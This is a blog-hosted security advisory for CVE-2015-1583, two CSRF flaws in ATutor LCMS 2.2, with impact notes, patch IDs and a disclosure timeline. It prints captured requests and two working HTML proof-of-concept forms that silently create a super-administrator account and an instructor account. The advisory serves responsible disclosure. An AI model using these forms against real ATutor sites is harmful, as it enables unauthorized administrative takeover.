<!DOCTYPE html>
<html lang="en-us">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
				[CVE-2015-1583] ATutor LCMS – CSRF Vulnerability in Version 2.2 &middot; Edric Teo
		</title>
<meta property="og:type" content="website" />
<meta property="og:url" content="https://edricteo.com/cve-2015-1583-atutor-lcms-csrf-vulnerability/" />
<meta property="og:image" content="https://edricteo.com/uploads/og-meta.jpg" />
<script src="/cdn-cgi/apps/head/5PfuO59QjFPFHNxMJZH4ILRAG0o.js"></script><link rel="stylesheet" href="/css/style.css" type="text/css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
<link rel="stylesheet" href="/custom.css" type="text/css">
<link rel="icon" type="image/png" sizes="32x32" href="/uploads/logo.png">
<link rel="icon" type="image/png" sizes="16x16" href="/uploads/logo.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
<link href="" rel="alternate" type="application/rss+xml" title="Edric Teo" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/themes/prism-okaidia.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/plugins/line-numbers/prism-line-numbers.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/plugins/toolbar/prism-toolbar.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/prism.min.js" type="text/javascript"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/plugins/line-numbers/prism-line-numbers.min.js" type="text/javascript"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/plugins/toolbar/prism-toolbar.min.js" type="text/javascript"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/plugins/normalize-whitespace/prism-normalize-whitespace.min.js" type="text/javascript"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js" type="text/javascript"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/components/prism-python.min.js" type="text/javascript"></script>
<script async src='/cdn-cgi/challenge-platform/h/b/scripts/invisible.js'></script></head>
<body>
<nav class="nav">
<div class="nav-container">
<a href="/">
<h2 class="nav-title">Edric Teo</h2>
</a>
<ul>
<li><a href="/about">About</a></li>
<li><a href="/advisory">Advisory</a></li>
<li><a href="/">Posts</a></li>
</ul>
</div>
</nav>
<main>
<div class="post">
<div class="post-info">
<span>Written by</span>
Edric Teo
<br>
<span>on&nbsp;</span><time datetime="2015-03-02 05:41:58 &#43;0000 UTC">March 2, 2015</time>
</div>
<h1 class="post-title">[CVE-2015-1583] ATutor LCMS – CSRF Vulnerability in Version 2.2</h1>
<div class="post-line"></div>
<p>[CVE-2015-1583] ATutor LCMS &#8211; CSRF Vulnerability in Version 2.2</p>
<hr />
<p>Product Information:</p>
<p>Software: ATutor LCMS</p>
<p>Tested Version: 2.2, released 25.8.2014</p>
<p>Vulnerability Type: Cross-Site Request Forgery, CSRF (CWE-352)</p>
<p>Download link: <a href="http://atutor.ca/atutor/download.php">http://atutor.ca/atutor/download.php</a></p>
<p>Description: ATutor is an Open Source Web-based Learning Content Management System (LCMS) designed with accessibility and adaptability in mind. (copied from <a href="http://www.atutor.ca/credits.php#whatatutor">http://www.atutor.ca/credits.php#whatatutor</a>)</p>
<hr />
<p>Issues:</p>
<p>1) CSRF in administrator creation page</p>
<p>2) CSRF in user creation page</p>
<hr />
<p>Vulnerability description:</p>
<p><strong>1) CSRF in administrator creation page</strong></p>
<p>When an authenticated administrative user of ATutor LCMS is creating another administrator account, the following POST request is sent to the server:</p>
<pre><code class="language-none line-numbers copy-to-clipboard">
POST /atutor-2.2/ATutor/mods/_core/users/admins/create.php HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Content-Length: 187
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1/atutor-2.2/ATutor/mods/_core/users/admins/create.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: ATutorID=pr6jq1tlfr204nm60p5rtbj0u4; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_limitsel=15; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; flash=yes; PHPSESSID=tg14v79ionj9d7lpelap300p33; cms-panel-collapsed-cms-menu=false; cms-panel-collapsed-cms-content-tools-CMSPagesController=true; cms-panel-collapsed-cms-content-tools-CMSMain=false; _gat=1; _ga=GA1.1.621011711.1425057132

form_password_hidden=ef0f8b6ffb699f90933a3321b00ff6769e018b94&password_error=&login=csr<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ee888f8a838780d7c89e8f9d9d99819c8ad3c88d818088879c83b19e8f9d9d99819c8ad3c89c8b8f82b1808f838bd3c88b838f8782d38d9d9c888f8a838780d7ae">[email&#160;protected]</a>admin.com&priv_admin=1&submit=Save
</code></pre>
<p>By executing the following Proof-of-Concept, a new administrative user called &#8220;csrfadmin99&#8221; will be created with the password &#8220;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6c5d1d0d16343f3b2c">[email&#160;protected]</a>&#8221;.</p>
<pre><code class="language-markup line-numbers copy-to-clipboard">
&lt;form action="http://127.0.0.1/atutor-2.2/ATutor/mods/_core/users/admins/create.php" method="POST"&gt;
    &lt;input name="form_password_hidden" type="hidden" value="ef0f8b6ffb699f90933a3321b00ff6769e018b94" /&gt;
    &lt;input name="login" type="hidden" value="csrfadmin99" /&gt;
    &lt;input name="real_name" type="hidden" value="csrfadmin99" /&gt;
    &lt;input name="email" type="hidden" value="<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d4b7a7a6b2b5b0b9bdbaeded94b5b0b9bdbafab7bbb9">[email&#160;protected]</a>" /&gt;
    &lt;input name="priv_admin" type="hidden" value="1" /&gt;
    &lt;input name="submit" type="hidden" value="Save" /&gt;
    &lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
</code></pre>
<p><strong>2) CSRF in user creation page</strong></p>
<p>When an authenticated administrative user of ATutor LCMS is creating an user, the following POST request is sent to the server:</p>
<pre><code class="language-none line-numbers copy-to-clipboard">
POST /atutor-2.2/ATutor/mods/_core/users/create_user.php HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Content-Length: 429
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1/atutor-2.2/ATutor/mods/_core/users/create_user.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: ATutorID=0h3qqin6ndjmpt21m7f17i07l7; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_limitsel=15; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; flash=yes; PHPSESSID=tg14v79ionj9d7lpelap300p33; cms-panel-collapsed-cms-menu=false; cms-panel-collapsed-cms-content-tools-CMSPagesController=true; cms-panel-collapsed-cms-content-tools-CMSMain=false; _gat=1; _ga=GA1.1.621011711.1425057132

ml=&password_error=&form_password_hidden=ef0f8b6ffb699f90933a3321b00ff6769e018b94&registration_token=19569b3551f19d60ddfbe4973d1733079f775568&<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0965666e6067346a7a7b6f7c7a6c7b302f6f667b645679687a7a7e667b6d38342f6f667b645679687a7a7e667b6d3b342f6c64686065346a7a7b6f7c7a6c7b3049">[email&#160;protected]</a><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="32474157401c515d5f1442405b445346576d575f535b5e0f0314575f535b5e000f51414054474157400b72474157401c515d5f">[email&#160;protected]</a>&first_name=csrfuser9&second_name=&last_name=csrfuser9&id=&status=3&old_status=&year=&month=&day=&address=&postal=&city=&province=&country=&phone=&website=&submit=+Save+
</code></pre>
<p>By executing the following Proof-of-Concept, a new instructor user called &#8220;csrfuser99&#8221; will be created with the password &#8220;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b283c3d3c8eae1e5f2">[email&#160;protected]</a>&#8221;.</p>
<pre><code class="language-markup line-numbers copy-to-clipboard">
&lt;form action="http://127.0.0.1/atutor-2.2/ATutor/mods/_core/users/create_user.php" method="POST"&gt;
    &lt;input name="form_password_hidden" type="hidden" value="ef0f8b6ffb699f90933a3321b00ff6769e018b94" /&gt;
    &lt;input name="login" type="hidden" value="csrfuser99" /&gt;
    &lt;input name="email" type="hidden" value="<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bad9c9c8dccfc9dfc88383facfc9dfc894d9d5d7">[email&#160;protected]</a>" /&gt;
    &lt;input name="private_email" type="hidden" value="1" /&gt;
    &lt;input name="email2" type="hidden" value="<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ec8f9f9e8a999f899ed5d5ac999f899ec28f8381">[email&#160;protected]</a>" /&gt;
    &lt;input name="first_name" type="hidden" value="csrfuser99" /&gt;
    &lt;input name="last_name" type="hidden" value="csrfuser99" /&gt;
    &lt;input name="status" type="hidden" value="3" /&gt;
    &lt;input name="submit" type="hidden" value="Save" /&gt;
    &lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
</code></pre>
<hr />
<p>Impact:</p>
<p>1) An attacker is able to create an administrator account with super administrator privilege.</p>
<p>2) An attacker is able to create an user account with instructor privilege.</p>
<hr />
<p>Solution:</p>
<p>Update using the in-built patcher, Patch ID 0009 and 0011.</p>
<hr />
<p>Timeline:</p>
<p>Vulnerability found: 10.2.2015 &amp; 28.2.2015</p>
<p>Vendor informed: 10.2.2015 &amp; 28.2.2015</p>
<p>Response by vendor: 11.2.2015 &amp; 28.2.2015</p>
<p>Fix by vendor 23.2.2015 &amp; 28.2.2015</p>
<p>Public Advisory: 1.3.2015</p>
<hr />
<p>This advisory is also available on <a href="http://www.securityfocus.com/archive/1/534778/30/0/threaded">securityfocus</a>.</p>
</div>
<div class="pagination">
<a href="/bedita-cms-xss-csrf-vulnerability-in-version/" class="right arrow">&#8594;</a>
<a href="#" class="top">Top</a>
</div>
</main>
<footer>
<span>
&copy; 2015-<time datetime="2021-09-30 05:55:48.868489353 &#43;0000 UTC m=&#43;0.221290868">2021</time> Edric Teo.
</span>
</footer>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">(function(){window['__CF$cv$params']={r:'6a6871454e4b61e2',m:'OPSgA.jZNLokGFSBaz_656O6gv8clWtCIMheW1Y7Tbo-1635636742-0-ARSm2VTnVByQ03RKmMwXLAsEqSLpqMaEnYLkPDBIWOXGcJ6tNAn7dzDULP0EGn6bEJyadwTvajLZFDg0NPb1leluUpoxolY+YDzqv1HuAEQemQYRb6QUXZ5V/BoverbQ7V3sQLQw0N8T76lmc/DfB2ThM3B94ycOFf0aPoshv36k',s:[0x2ee0377510,0x19adebfab7],u:'/cdn-cgi/challenge-platform/h/b'}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"6a6871454e4b61e2","version":"2021.10.0","r":1,"token":"e7388f078919472ebde7c41dc94a8070","si":100}'></script>
</body>
</html>
